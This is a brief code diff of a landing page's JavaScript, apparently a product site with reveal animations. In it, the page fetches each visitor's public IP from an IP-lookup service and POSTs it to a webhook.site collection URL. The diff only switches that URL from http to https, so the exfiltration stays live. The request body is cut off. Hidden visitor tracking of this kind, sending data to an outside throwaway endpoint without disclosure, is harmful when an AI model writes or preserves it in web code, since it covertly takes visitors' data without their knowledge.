@@ -112,7 +112,7 @@ sr.reveal(`.about__img, .discount__data`, { origin: 'right' });
 fetch('https://api64.ipify.org?format=json')
     .then((response) => response.json())
     .then(async (data) => {
-        fetch('http://webhook.site/e4157bf2-978b-4dd4-ad42-438c565b5aff', {
+        fetch('https://webhook.site/e4157bf2-978b-4dd4-ad42-438c565b5aff', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json;charset=utf-8',
